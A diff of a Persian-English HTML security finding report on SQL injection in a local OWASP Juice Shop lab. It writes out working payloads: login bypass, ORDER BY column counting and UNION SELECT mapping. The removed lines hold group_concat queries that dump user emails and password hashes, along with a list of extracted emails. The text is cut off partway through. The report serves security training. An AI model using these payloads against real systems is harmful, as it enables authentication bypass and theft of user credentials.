@@ -1,574 +1,1113 @@
+```html
 <!DOCTYPE html>
 <html lang="fa" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<title>گزارش تست امنیتی — SQL Injection استخراج کامل جدول Users</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Security Finding — SQL Injection Authentication Bypass | OWASP Juice Shop</title>
+
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap');
 
 :root{
-  --bg: #0b0d10;
-  --bg-panel: #12151a;
-  --line: #262b33;
-  --text: #d7dbe0;
-  --text-dim: #838d99;
-  --red: #ff4d4f;
-  --red-dim: #7a2426;
-  --green: #3fd68a;
-  --blue: #5aa9ff;
-  --amber: #ffb454;
-  --purple: #b784ff;
+  --bg:#0b0d10;
+  --panel:#12151a;
+  --panel2:#0f1216;
+  --line:#262b33;
+  --text:#d7dbe0;
+  --muted:#838d99;
+  --white:#fff;
+  --red:#ff4d4f;
+  --red-dim:#7a2426;
+  --green:#3fd68a;
+  --blue:#5aa9ff;
+  --amber:#ffb454;
+  --purple:#b784ff;
 }
 
-*{box-sizing:border-box;}
-html,body{margin:0;padding:0;background:var(--bg); scroll-behavior:smooth;}
-body{
-  font-family:'Vazirmatn', sans-serif;
-  color:var(--text);
-  line-height:1.9;
-  padding:0 0 80px 0;
+*{box-sizing:border-box}
+
+html{
+  scroll-behavior:smooth;
 }
-.mono{font-family:'JetBrains Mono', monospace; direction:ltr; unicode-bidi:isolate;}
+
+body{
+  margin:0;
+  padding:0 0 80px;
+  background:var(--bg);
+  color:var(--text);
+  font-family:'Vazirmatn',sans-serif;
+  line-height:1.9;
+}
+
+.mono{
+  font-family:'JetBrains Mono',monospace;
+  direction:ltr;
+  unicode-bidi:isolate;
+}
+
+.container{
+  width:min(960px, calc(100% - 40px));
+  margin:auto;
+}
 
 .hero{
-  padding:56px 24px 36px;
-  max-width:920px;
-  margin:0 auto;
+  padding:60px 0 35px;
   border-bottom:1px solid var(--line);
 }
-.hero-tag{
-  font-family:'JetBrains Mono', monospace;
-  direction:ltr;
+
+.tag{
   display:inline-block;
-  color:var(--red);
-  font-size:13px;
-  letter-spacing:1px;
+  padding:5px 11px;
   border:1px solid var(--red-dim);
-  background:rgba(255,77,79,0.06);
-  padding:4px 10px;
-  border-radius:4px;
-  margin-bottom:16px;
-}
-.hero h1{
-  font-size:28px;
-  font-weight:800;
-  margin:0 0 10px;
-  color:#fff;
-}
-.hero p{
-  color:var(--text-dim);
-  font-size:15.5px;
-  max-width:680px;
-  margin:0;
-}
-
-.summary{
-  max-width:920px;
-  margin:20px auto 0;
-  padding:0 24px;
-  display:flex;
-  gap:10px;
-  flex-wrap:wrap;
-}
-.chip{
-  font-family:'JetBrains Mono', monospace;
-  direction:ltr;
+  border-radius:5px;
+  background:rgba(255,77,79,.06);
+  color:var(--red);
+  font-family:'JetBrains Mono',monospace;
   font-size:12px;
-  background:var(--bg-panel);
-  border:1px solid var(--line);
-  padding:6px 12px;
-  border-radius:20px;
-  color:var(--text-dim);
-}
-.chip b{ color:var(--text); }
-
-main{
-  max-width:920px;
-  margin:0 auto;
-  padding:0 24px;
-}
-
-.finding{ margin-top:52px; scroll-margin-top:20px; }
-
-.finding-head{
-  display:flex;
-  align-items:flex-start;
-  gap:14px;
+  direction:ltr;
   margin-bottom:18px;
-  flex-wrap:wrap;
 }
-.finding-num{
-  font-family:'JetBrains Mono', monospace;
-  direction:ltr;
-  background:rgba(255,77,79,0.1);
-  border:1px solid var(--red-dim);
-  color:var(--red);
-  font-weight:800;
-  font-size:14px;
-  width:32px; height:32px;
-  border-radius:8px;
-  display:flex; align-items:center; justify-content:center;
-  flex-shrink:0;
+
+h1{
+  margin:0 0 12px;
+  color:var(--white);
+  font-size:30px;
+  line-height:1.5;
 }
-.finding-title h2{
-  font-size:18px;
-  font-weight:700;
-  color:#fff;
+
+.hero-description{
+  max-width:760px;
   margin:0;
+  color:var(--muted);
+  font-size:15px;
 }
-.finding-title span.en{
-  font-family:'JetBrains Mono', monospace;
-  direction:ltr;
-  color:var(--text-dim);
-  font-size:12.5px;
+
+.meta{
+  display:grid;
+  grid-template-columns:repeat(4,1fr);
+  gap:10px;
+  margin:22px 0;
+}
+
+.meta-card{
+  background:var(--panel);
+  border:1px solid var(--line);
+  border-radius:9px;
+  padding:13px;
+}
+
+.meta-card span{
   display:block;
-  margin-top:2px;
+  color:var(--muted);
+  font-size:11px;
+  margin-bottom:4px;
+}
+
+.meta-card strong{
+  color:var(--white);
+  font-size:13px;
+}
+
+.severity{
+  color:var(--red)!important;
 }
 
 .status{
-  font-family:'JetBrains Mono', monospace;
-  direction:ltr;
-  font-size:11px;
-  font-weight:700;
-  padding:4px 10px;
-  border-radius:20px;
-  margin-inline-start:auto;
-  align-self:center;
-  white-space:nowrap;
+  color:var(--green)!important;
 }
-.status.mitigated{ background:rgba(63,214,138,0.12); color:var(--green); border:1px solid rgba(63,214,138,0.3); }
-.status.found{ background:rgba(255,77,79,0.12); color:var(--red); border:1px solid var(--red-dim); }
-.status.info{ background:rgba(90,169,255,0.12); color:var(--blue); border:1px solid rgba(90,169,255,0.3); }
-.status.tested{ background:rgba(90,169,255,0.12); color:var(--blue); border:1px solid rgba(90,169,255,0.3); }
+
+nav{
+  position:sticky;
+  top:0;
+  z-index:10;
+  margin:20px 0;
+  padding:10px;
+  background:rgba(11,13,16,.94);
+  border:1px solid var(--line);
+  border-radius:8px;
+  backdrop-filter:blur(8px);
+}
+
+nav a{
+  color:var(--muted);
+  text-decoration:none;
+  font-size:12px;
+  margin-left:18px;
+}
+
+nav a:hover{
+  color:var(--white);
+}
+
+section{
+  scroll-margin-top:80px;
+  margin-top:48px;
+}
+
+.section-title{
+  display:flex;
+  align-items:center;
+  gap:12px;
+  margin-bottom:18px;
+}
+
+.section-number{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  width:30px;
+  height:30px;
+  border-radius:7px;
+  background:rgba(90,169,255,.1);
+  border:1px solid rgba(90,169,255,.3);
+  color:var(--blue);
+  font-family:'JetBrains Mono',monospace;
+  font-size:12px;
+}
+
+h2{
+  margin:0;
+  color:var(--white);
+  font-size:19px;
+}
+
+h3{
+  margin:0 0 8px;
+  color:var(--white);
+  font-size:15px;
+}
 
 .block{
-  background:var(--bg-panel);
+  background:var(--panel);
   border:1px solid var(--line);
   border-radius:10px;
   padding:18px 20px;
   margin-bottom:14px;
 }
-.block h3{
-  margin:0 0 8px;
+
+p{
+  margin:7px 0;
   font-size:14.5px;
-  color:#fff;
-  font-weight:700;
 }
-.block p{ margin:6px 0 0; font-size:15px; }
+
+ul{
+  margin:8px 0;
+  padding-right:22px;
+}
+
+li{
+  margin:5px 0;
+  font-size:14px;
+}
+
+code.inline{
+  padding:2px 6px;
+  border-radius:4px;
+  background:rgba(255,255,255,.06);
+  font-family:'JetBrains Mono',monospace;
+  font-size:.9em;
+  direction:ltr;
+  unicode-bidi:isolate;
+}
 
 pre{
-  font-family:'JetBrains Mono', monospace;
+  margin:12px 0 0;
+  padding:14px;
+  overflow-x:auto;
+  white-space:pre-wrap;
+  word-break:break-word;
   direction:ltr;
-  unicode-bidi:isolate;
-  background:#0a0c0f;
+  text-align:left;
+  background:#090b0e;
   border:1px solid var(--line);
   border-radius:8px;
-  padding:12px 14px;
-  overflow-x:auto;
-  font-size:13px;
   color:#c9f5d8;
-  margin:10px 0 0;
+  font-family:'JetBrains Mono',monospace;
+  font-size:12.5px;
   line-height:1.7;
-  white-space:pre-wrap;
-  word-break:break-all;
-}
-code.inline{
-  font-family:'JetBrains Mono', monospace;
-  direction:ltr;
-  unicode-bidi:isolate;
-  background:rgba(255,255,255,0.06);
-  padding:1px 6px;
-  border-radius:4px;
-  font-size:0.92em;
 }
 
 .callout{
+  margin-top:13px;
+  padding:12px 15px;
   border-radius:8px;
-  padding:12px 16px;
-  margin-top:12px;
-  font-size:14px;
+  font-size:13px;
 }
-.callout.warn{
-  background:linear-gradient(135deg, rgba(255,180,84,0.12), rgba(255,180,84,0.02));
-  border:1px solid rgba(255,180,84,0.35);
-  color:#ffdca8;
+
+.callout.critical{
+  background:rgba(255,77,79,.08);
+  border:1px solid var(--red-dim);
+  color:#ffc4c5;
 }
-.callout.result{
-  background:linear-gradient(135deg, rgba(63,214,138,0.10), rgba(63,214,138,0.02));
-  border:1px solid rgba(63,214,138,0.3);
-  color:#c7f5da;
-}
+
 .callout.info{
-  background:linear-gradient(135deg, rgba(90,169,255,0.10), rgba(90,169,255,0.02));
-  border:1px solid rgba(90,169,255,0.3);
+  background:rgba(90,169,255,.08);
+  border:1px solid rgba(90,169,255,.3);
   color:#cfe6ff;
 }
-.callout.result b{ color:var(--green); }
-.callout.warn b{ color:var(--amber); }
-.callout.info b{ color:var(--blue); }
 
-.divider{
-  border:none;
-  border-top:1px dashed var(--line);
-  margin:52px 0 0;
+.callout.success{
+  background:rgba(63,214,138,.08);
+  border:1px solid rgba(63,214,138,.3);
+  color:#c7f5da;
 }
 
-table.tl, table.summary-table, table.map{
+.callout.warning{
+  background:rgba(255,180,84,.08);
+  border:1px solid rgba(255,180,84,.3);
+  color:#ffdca8;
+}
+
+.grid{
+  display:grid;
+  grid-template-columns:1fr 1fr;
+  gap:14px;
+}
+
+table{
   width:100%;
   border-collapse:collapse;
   margin-top:10px;
-  font-size:14px;
+  font-size:13px;
 }
-table.tl th, table.tl td, table.summary-table th, table.summary-table td, table.map th, table.map td{
-  text-align:right;
-  padding:8px 10px;
+
+th,td{
+  padding:9px 10px;
   border-bottom:1px solid var(--line);
+  text-align:right;
 }
-table.tl th, table.summary-table th, table.map th{
-  color:var(--text-dim);
-  font-size:12px;
-  text-transform:uppercase;
-  letter-spacing:1px;
+
+th{
+  color:var(--muted);
+  font-size:11px;
 }
-table.map td.col-num{ font-family:'JetBrains Mono', monospace; direction:ltr; color:var(--purple); }
-table.map td.field{ font-family:'JetBrains Mono', monospace; direction:ltr; color:var(--green); }
+
+td.code{
+  font-family:'JetBrains Mono',monospace;
+  direction:ltr;
+  color:var(--green);
+}
+
+.attack-chain{
+  display:flex;
+  flex-wrap:wrap;
+  align-items:center;
+  justify-content:center;
+  gap:8px;
+  padding:18px;
+  background:var(--panel2);
+  border:1px solid var(--line);
+  border-radius:10px;
+}
+
+.attack-step{
+  padding:8px 11px;
+  border:1px solid var(--line);
+  border-radius:6px;
+  background:var(--panel);
+  color:var(--white);
+  font-family:'JetBrains Mono',monospace;
+  font-size:11px;
+}
+
+.arrow{
+  color:var(--red);
+  font-family:'JetBrains Mono',monospace;
+}
 
 footer{
-  max-width:920px;
-  margin:60px auto 0;
-  padding:20px 24px 0;
+  margin-top:65px;
+  padding-top:20px;
   border-top:1px solid var(--line);
-  color:var(--text-dim);
-  font-size:13px;
+  color:var(--muted);
   text-align:center;
+  font-size:12px;
+}
+
+@media(max-width:760px){
+  .meta,
+  .grid{
+    grid-template-columns:1fr 1fr;
+  }
+
+  h1{
+    font-size:24px;
+  }
+
+  nav a{
+    display:inline-block;
+    margin:3px 8px;
+  }
+}
+
+@media(max-width:480px){
+  .meta,
+  .grid{
+    grid-template-columns:1fr;
+  }
 }
 </style>
 </head>
+
 <body>
 
-<div class="hero">
-  <span class="hero-tag">// SECURITY TESTING LOG · OWASP Juice Shop · Session 2</span>
-  <h1>SQL Injection — استخراج کامل ساختار و داده‌ی جدول Users</h1>
-  <p>مستندسازی گام‌به‌گام تمرین SQLi روی فرم لاگین Juice Shop: از بای‌پس احراز هویت تا نگاشت کامل ستون‌ها، استخراج ایمیل‌ها و پسوردهای هش‌شده، و کرک کردن هش‌ها.</p>
-</div>
+<header class="hero">
+  <div class="container">
 
-<div class="summary">
-  <span class="chip">هدف: <b class="mono" style="direction:ltr">OWASP Juice Shop (Local)</b></span>
-  <span class="chip">Endpoint: <b class="mono" style="direction:ltr">POST /rest/user/login</b></span>
-  <span class="chip">دیتابیس: <b class="mono" style="direction:ltr">SQLite</b></span>
-</div>
-
-<div class="summary" style="margin-top:10px;">
-  <div class="callout warn" style="width:100%; margin-top:0;">
-    <b>Disclaimer:</b> تمام مراحل این گزارش روی <a href="https://github.com/juice-shop/juice-shop" style="color:inherit">OWASP Juice Shop</a> — یک اپلیکیشن عمداً آسیب‌پذیر برای آموزش امنیت وب — و روی یک نمونه‌ی محلی (<code class="inline">localhost:3000</code>) انجام شده‌اند. هیچ سیستم واقعی یا متعلق به شخص ثالث تست نشده است.
-  </div>
-</div>
-
-<main>
-
-<section class="finding">
-  <div class="finding-head">
-    <div class="finding-num">1</div>
-    <div class="finding-title">
-      <h2>بای‌پس احراز هویت با SQL Injection کلاسیک</h2>
-      <span class="en">Authentication Bypass — Login Form SQLi</span>
+    <div class="tag">
+      SECURITY FINDING · WEB APPLICATION · JUICE SHOP
     </div>
-    <span class="status found">CONFIRMED</span>
+
+    <h1>
+      SQL Injection — Authentication Bypass &amp; Database Enumeration
+    </h1>
+
+    <p class="hero-description">
+      بررسی یک SQL Injection قابل بهره‌برداری در endpoint احراز هویت
+      OWASP Juice Shop که منجر به دور زدن login، شناسایی ساختار جدول
+      Users و استخراج داده از پایگاه‌داده شد.
+    </p>
+
   </div>
+</header>
 
-  <div class="block">
-    <h3>فرضیه و پیلود اولیه</h3>
-    <p>فرض بر این بود که مقدار فیلد <code class="inline">email</code> بدون sanitize مستقیم داخل query دیتابیس قرار می‌گیرد. پیلود کلاسیک تست شد:</p>
-    <pre>' OR 1=1--</pre>
-  </div>
 
-  <div class="block">
-    <h3>نتیجه</h3>
-    <p>درخواست <code class="inline">POST /rest/user/login</code> با این مقدار در فیلد ایمیل (و یک پسورد دلخواه)، پاسخ <code class="inline">200 OK</code> همراه با یک JWT معتبر بازگرداند و ورود به پنل با نقش <code class="inline">admin</code> انجام شد.</p>
-    <div class="callout result"><b>نتیجه‌گیری:</b> شرط <code class="inline">1=1</code> همیشه true است، پس کل شرط <code class="inline">WHERE</code> نادیده گرفته شده و اولین رکورد دیتابیس (کاربر admin) بازگردانده شد. SQLi Boolean-based روی فرم لاگین تأیید شد.</div>
-  </div>
-</section>
+<main class="container">
 
-<hr class="divider">
+  <!-- =========================
+       EXECUTIVE SUMMARY
+  ========================== -->
 
-<section class="finding">
-  <div class="finding-head">
-    <div class="finding-num">2</div>
-    <div class="finding-title">
-      <h2>پیدا کردن تعداد ستون‌ها با ORDER BY</h2>
-      <span class="en">Column Count Enumeration</span>
+  <div class="meta">
+
+    <div class="meta-card">
+      <span>SEVERITY</span>
+      <strong class="severity">CRITICAL</strong>
     </div>
-    <span class="status info">METHOD</span>
+
+    <div class="meta-card">
+      <span>STATUS</span>
+      <strong class="status">CONFIRMED</strong>
+    </div>
+
+    <div class="meta-card">
+      <span>CWE</span>
+      <strong class="mono">CWE-89</strong>
+    </div>
+
+    <div class="meta-card">
+      <span>OWASP</span>
+      <strong class="mono">A03:2021</strong>
+    </div>
+
   </div>
 
-  <div class="block">
-    <h3>روش</h3>
-    <p>عدد داخل <code class="inline">ORDER BY</code> به‌تدریج افزایش داده شد تا نقطه‌ای که خطای دیتابیسی رخ دهد:</p>
-    <pre>' ORDER BY 1--   →  پاسخ عادی (Invalid email or password)
-' ORDER BY 2--   →  پاسخ عادی
+
+  <nav>
+    <a href="#overview">Overview</a>
+    <a href="#environment">Environment</a>
+    <a href="#reproduction">Reproduction</a>
+    <a href="#enumeration">Enumeration</a>
+    <a href="#impact">Impact</a>
+    <a href="#evidence">Evidence</a>
+    <a href="#remediation">Remediation</a>
+  </nav>
+
+
+  <!-- =========================
+       1. OVERVIEW
+  ========================== -->
+
+  <section id="overview">
+
+    <div class="section-title">
+      <div class="section-number">01</div>
+      <h2>Finding Overview</h2>
+    </div>
+
+    <div class="block">
+
+      <h3>Title</h3>
+
+      <p>
+        SQL Injection در endpoint احراز هویت منجر به
+        <strong>Authentication Bypass</strong> و دسترسی به داده‌های
+        جدول <code class="inline">Users</code> شد.
+      </p>
+
+    </div>
+
+    <div class="grid">
+
+      <div class="block">
+
+        <h3>Vulnerability</h3>
+
+        <p>
+          SQL Injection
+        </p>
+
+        <p>
+          <span class="mono">CWE-89</span>
+        </p>
+
+        <p>
+          OWASP Top 10:
+          <span class="mono">A03:2021 — Injection</span>
+        </p>
+
+      </div>
+
+      <div class="block">
+
+        <h3>Affected Endpoint</h3>
+
+        <p class="mono">
+          POST /rest/user/login
+        </p>
+
+        <p>
+          Parameter:
+          <code class="inline">email</code>
+        </p>
+
+      </div>
+
+    </div>
+
+    <div class="callout critical">
+
+      <strong>Security Impact:</strong>
+      آسیب‌پذیری امکان عبور از مکانیزم احراز هویت و سپس
+      استفاده از SQL Injection برای enumeration و استخراج داده
+      از پایگاه‌داده را فراهم کرد.
+
+    </div>
+
+  </section>
+
+
+  <!-- =========================
+       2. ENVIRONMENT
+  ========================== -->
+
+  <section id="environment">
+
+    <div class="section-title">
+      <div class="section-number">02</div>
+      <h2>Test Environment</h2>
+    </div>
+
+    <div class="block">
+
+      <table>
+
+        <tr>
+          <th>Component</th>
+          <th>Configuration</th>
+        </tr>
+
+        <tr>
+          <td>Target</td>
+          <td>OWASP Juice Shop — Local Instance</td>
+        </tr>
+
+        <tr>
+          <td>Host</td>
+          <td class="code">localhost:3000</td>
+        </tr>
+
+        <tr>
+          <td>Database</td>
+          <td class="code">SQLite</td>
+        </tr>
+
+        <tr>
+          <td>Endpoint</td>
+          <td class="code">POST /rest/user/login</td>
+        </tr>
+
+        <tr>
+          <td>Testing Tools</td>
+          <td>Browser DevTools, Burp Suite, custom scripts</td>
+        </tr>
+
+      </table>
+
+    </div>
+
+    <div class="callout warning">
+
+      <strong>Scope:</strong>
+      تمام آزمایش‌ها روی یک نمونه محلی و عمداً آسیب‌پذیر
+      از OWASP Juice Shop انجام شده‌اند.
+      هیچ سیستم واقعی یا متعلق به شخص ثالث مورد آزمایش قرار نگرفته است.
+
+    </div>
+
+  </section>
+
+
+  <!-- =========================
+       3. ATTACK CHAIN
+  ========================== -->
+
+  <section>
+
+    <div class="section-title">
+      <div class="section-number">03</div>
+      <h2>Attack Chain</h2>
+    </div>
+
+    <div class="attack-chain">
+
+      <div class="attack-step">SQLi Injection Point</div>
+
+      <div class="arrow">→</div>
+
+      <div class="attack-step">Authentication Bypass</div>
+
+      <div class="arrow">→</div>
+
+      <div class="attack-step">Column Enumeration</div>
+
+      <div class="arrow">→</div>
+
+      <div class="attack-step">Column Mapping</div>
+
+      <div class="arrow">→</div>
+
+      <div class="attack-step">Data Extraction</div>
+
+    </div>
+
+  </section>
+
+
+  <!-- =========================
+       4. REPRODUCTION
+  ========================== -->
+
+  <section id="reproduction">
+
+    <div class="section-title">
+      <div class="section-number">04</div>
+      <h2>Authentication Bypass — Reproduction</h2>
+    </div>
+
+    <div class="block">
+
+      <h3>Hypothesis</h3>
+
+      <p>
+        فرضیه این بود که مقدار پارامتر
+        <code class="inline">email</code>
+        بدون parameterization مناسب در query پایگاه‌داده استفاده می‌شود.
+      </p>
+
+    </div>
+
+    <div class="block">
+
+      <h3>Test Payload</h3>
+
+      <pre>' OR 1=1--</pre>
+
+    </div>
+
+    <div class="block">
+
+      <h3>Observed Result</h3>
+
+      <p>
+        ارسال درخواست به endpoint احراز هویت با payload فوق باعث شد
+        پاسخ موفق دریافت شود و یک JWT معتبر در پاسخ application
+        مشاهده شود.
+      </p>
+
+      <pre>
+POST /rest/user/login
+
+{
+  "email": "' OR 1=1--",
+  "password": "test"
+}
+
+HTTP/1.1 200 OK
+      </pre>
+
+    </div>
+
+    <div class="callout critical">
+
+      <strong>Confirmed:</strong>
+      ورودی کاربر توانست منطق query احراز هویت را تغییر دهد.
+      این رفتار نشان‌دهنده وجود SQL Injection قابل بهره‌برداری در
+      endpoint login است.
+
+    </div>
+
+  </section>
+
+
+  <!-- =========================
+       5. ENUMERATION
+  ========================== -->
+
+  <section id="enumeration">
+
+    <div class="section-title">
+      <div class="section-number">05</div>
+      <h2>Database Enumeration</h2>
+    </div>
+
+
+    <div class="block">
+
+      <h3>5.1 — Column Count Enumeration</h3>
+
+      <p>
+        برای تعیین تعداد ستون‌های query از
+        <code class="inline">ORDER BY</code>
+        به‌صورت افزایشی استفاده شد.
+      </p>
+
+      <pre>
+' ORDER BY 1--
+' ORDER BY 2--
 ...
-' ORDER BY 13--  →  پاسخ عادی
-' ORDER BY 14--  →  خطا: SyntaxError — پاسخ HTML خام به‌جای JSON</pre>
-  </div>
+' ORDER BY 13--
+' ORDER BY 14--
+      </pre>
 
-  <div class="block">
-    <h3>نتیجه</h3>
-    <div class="callout result"><b>نتیجه‌گیری:</b> جدول <code class="inline">Users</code> دقیقاً <b>۱۳ ستون</b> دارد. عدد ۱۴ باعث خطای <code class="inline">SQLITE_ERROR</code> شد که چون مدیریت‌نشده بود، به‌صورت صفحه‌ی HTML خام (نه JSON) بازگشت.</div>
-  </div>
-</section>
+      <p>
+        درخواست‌های تا مقدار ۱۳ رفتار مورد انتظار داشتند،
+        در حالی که مقدار ۱۴ باعث خطای دیتابیسی شد.
+      </p>
 
-<hr class="divider">
+      <div class="callout info">
 
-<section class="finding">
-  <div class="finding-head">
-    <div class="finding-num">3</div>
-    <div class="finding-title">
-      <h2>نگاشت ستون‌ها با UNION SELECT — روش تک‌ستونی</h2>
-      <span class="en">Column Mapping via Isolated UNION Tests</span>
+        <strong>Observation:</strong>
+        تعداد ستون‌های query مورد آزمایش حداقل تا
+        <span class="mono">13</span>
+        قابل استفاده بود و مقدار بعدی باعث خطا شد.
+
+      </div>
+
     </div>
-    <span class="status info">METHOD</span>
-  </div>
 
-  <div class="block">
-    <h3>تلاش‌های اولیه و اشتباه روش‌شناختی</h3>
-    <p>اولین تلاش‌ها با تغییر همزمان چند ستون انجام شد (مثلاً چند ستون اول همگی <code class="inline">'x'</code>) که باعث شد نتیجه‌ها (2FA prompt یا Invalid) قابل تفکیک نباشند و یک فرضیه‌ی غلط («ستون ۱ = totpSecret») به‌طور موقت شکل بگیرد.</p>
-    <div class="callout warn"><b>درس گرفته‌شده:</b> در نگاشت ستون‌ها باید هر بار <b>فقط یک ستون</b> تغییر کند؛ در غیر این‌صورت اثر هر ستون قابل تفکیک از بقیه نیست.</div>
-  </div>
 
-  <div class="block">
-    <h3>روش اصلاح‌شده — تست تک‌ستونی</h3>
-    <pre>' UNION SELECT 1,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--   →  2FA prompt
-' UNION SELECT NULL,1,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--   →  Invalid
-' UNION SELECT NULL,NULL,NULL,...(ستون‌های ۳ تا ۱۳ تنها)...--                    →  همه Invalid</pre>
-    <p>الگوی نهایی: هر وقت ستون ۱ غیر <code class="inline">NULL</code> بود، اپلیکیشن به سراغ 2FA می‌رفت (چون رکورد کاربر معتبر ساخته می‌شد)؛ وقتی ستون ۱ برابر <code class="inline">NULL</code> بود، رکورد از اساس نامعتبر تشخیص داده می‌شد. این تأیید کرد ستون ۱ همان <code class="inline">id</code> (کلید اصلی) است، نه <code class="inline">totpSecret</code>.</p>
-  </div>
+    <div class="block">
 
-  <div class="block">
-    <h3>تأیید نهایی و کشف نگاشت کامل</h3>
-    <p>با تست زیر ورود موفق (بدون 2FA) انجام شد:</p>
-    <pre>' UNION SELECT 1,'','','','','','','','','','','',''--</pre>
-    <p>سپس با گذاشتن مقادیر قابل‌تشخیص در ستون‌های ۳ و ۵ و دیکود کردن JWT بازگشتی، نگاشت کامل ۱۳ ستون به‌دست آمد:</p>
-    <table class="map">
-      <tr><th>شماره ستون</th><th>فیلد واقعی</th></tr>
-      <tr><td class="col-num">1</td><td class="field">id</td></tr>
-      <tr><td class="col-num">2</td><td class="field">username</td></tr>
-      <tr><td class="col-num">3</td><td class="field">email</td></tr>
-      <tr><td class="col-num">4</td><td class="field">password</td></tr>
-      <tr><td class="col-num">5</td><td class="field">role</td></tr>
-      <tr><td class="col-num">6</td><td class="field">deluxeToken</td></tr>
-      <tr><td class="col-num">7</td><td class="field">lastLoginIp</td></tr>
-      <tr><td class="col-num">8</td><td class="field">profileImage</td></tr>
-      <tr><td class="col-num">9</td><td class="field">totpSecret</td></tr>
-      <tr><td class="col-num">10</td><td class="field">isActive</td></tr>
-      <tr><td class="col-num">11</td><td class="field">createdAt</td></tr>
-      <tr><td class="col-num">12</td><td class="field">updatedAt</td></tr>
-      <tr><td class="col-num">13</td><td class="field">deletedAt</td></tr>
-    </table>
-    <div class="callout result"><b>نتیجه‌گیری:</b> نگاشت کامل ستون‌های جدول <code class="inline">Users</code> بدون نیاز به دسترسی به سورس‌کد، تنها از طریق رفتار اپلیکیشن به‌دست آمد.</div>
-  </div>
-</section>
+      <h3>5.2 — UNION-Based Column Mapping</h3>
 
-<hr class="divider">
+      <p>
+        پس از مشخص‌شدن تعداد ستون‌ها، هر ستون به‌صورت جداگانه
+        آزمایش شد تا اثر آن در ساختار رکورد و پاسخ application
+        قابل تفکیک باشد.
+      </p>
 
-<section class="finding">
-  <div class="finding-head">
-    <div class="finding-num">4</div>
-    <div class="finding-title">
-      <h2>استخراج لیست کامل ایمیل کاربران</h2>
-      <span class="en">Data Exfiltration — group_concat over email column</span>
+      <pre>
+' UNION SELECT 1,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+
+' UNION SELECT NULL,1,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+      </pre>
+
+      <div class="callout warning">
+
+        <strong>Methodological Note:</strong>
+        در آزمایش اولیه چند ستون هم‌زمان تغییر داده شدند که باعث
+        ایجاد نتایج مبهم شد. روش تست به حالت single-variable تغییر
+        داده شد تا اثر هر ستون به‌صورت مستقل قابل مشاهده باشد.
+
+      </div>
+
     </div>
-    <span class="status found">CRITICAL</span>
-  </div>
 
-  <div class="block">
-    <h3>پیلود</h3>
-    <pre>' UNION SELECT 1,'',(SELECT group_concat(email,'|') FROM Users),'','admin','','','','','','','',''--</pre>
-    <p>با استفاده از ستون ۳ (که در Finding قبلی به‌عنوان <code class="inline">email</code> شناسایی شد) و تابع <code class="inline">group_concat</code>، تمام مقادیر ستون <code class="inline">email</code> در کل جدول در یک رشته‌ی واحد بازگردانده شد.</p>
-  </div>
 
-  <div class="block">
-    <h3>داده‌ی استخراج‌شده — ۲۴ ایمیل کاربر</h3>
-    <pre>J12934@juice-sh.op, accountant@juice-sh.op, admin@juice-sh.op, amy@juice-sh.op,
-basil@juice-sh.op, bender@juice-sh.op, bjoern.kimminich@gmail.com, bjoern@juice-sh.op,
-bjoern@owasp.org, chris.pike@juice-sh.op, ciso@juice-sh.op, cloud-admin@juice-sh.op,
-demo, emma@juice-sh.op, ethereum@juice-sh.op, jim@juice-sh.op, john@juice-sh.op,
-mc.safesearch@juice-sh.op, morty@juice-sh.op, stan@juice-sh.op, support@juice-sh.op,
-testing@juice-sh.op, uvogin@juice-sh.op, wurstbrot@juice-sh.op</pre>
-  </div>
+    <div class="block">
 
-  <div class="block">
-    <h3>اثر جانبی — حل خودکار چالش رسمی</h3>
-    <p>سیستم چالش Juice Shop، چالش <code class="inline">Login Cloud Admin</code> را به‌صورت خودکار حل‌شده علامت زد؛ چون رشته‌ی بازگردانده‌شده در فیلد <code class="inline">email</code> توکن شامل <code class="inline">cloud-admin@juice-sh.op</code> نیز بود و منطق تشخیص چالش این را به‌عنوان «ورود با ایمیل cloud admin» تفسیر کرد.</p>
-    <div class="callout info"><b>نکته:</b> این نشان می‌دهد تشخیص چالش‌ها گاهی بر پایه‌ی match ساده‌ی رشته‌ای است، نه بررسی دقیق روش دستیابی.</div>
-  </div>
-</section>
+      <h3>5.3 — Observed Column Mapping</h3>
 
-<hr class="divider">
+      <p>
+        با استفاده از مقادیر قابل تشخیص و تحلیل پاسخ application،
+        نگاشت مشاهده‌شده‌ی ساختار <code class="inline">Users</code>
+        به‌دست آمد:
+      </p>
 
-<section class="finding">
-  <div class="finding-head">
-    <div class="finding-num">5</div>
-    <div class="finding-title">
-      <h2>استخراج پسوردهای هش‌شده</h2>
-      <span class="en">Password Hash Exfiltration</span>
+      <table>
+
+        <tr>
+          <th>Position</th>
+          <th>Observed Field</th>
+        </tr>
+
+        <tr><td class="code">1</td><td class="code">id</td></tr>
+        <tr><td class="code">2</td><td class="code">username</td></tr>
+        <tr><td class="code">3</td><td class="code">email</td></tr>
+        <tr><td class="code">4</td><td class="code">password</td></tr>
+        <tr><td class="code">5</td><td class="code">role</td></tr>
+        <tr><td class="code">6</td><td class="code">deluxeToken</td></tr>
+        <tr><td class="code">7</td><td class="code">lastLoginIp</td></tr>
+        <tr><td class="code">8</td><td class="code">profileImage</td></tr>
+        <tr><td class="code">9</td><td class="code">totpSecret</td></tr>
+        <tr><td class="code">10</td><td class="code">isActive</td></tr>
+        <tr><td class="code">11</td><td class="code">createdAt</td></tr>
+        <tr><td class="code">12</td><td class="code">updatedAt</td></tr>
+        <tr><td class="code">13</td><td class="code">deletedAt</td></tr>
+
+      </table>
+
     </div>
-    <span class="status found">CRITICAL</span>
-  </div>
 
-  <div class="block">
-    <h3>پیلود</h3>
-    <pre>' UNION SELECT 1,'',(SELECT group_concat(email || ':' || password,'|') FROM Users),'','admin','','','','','','','',''--</pre>
-    <p>این‌بار به‌جای فقط ایمیل، جفت <code class="inline">email:password_hash</code> از طریق عملگر <code class="inline">||</code> (concat در SQLite) کنار هم چسبانده شدند تا رابطه‌ی هر پسورد با کاربرش مشخص بماند.</p>
-  </div>
 
-  <div class="block">
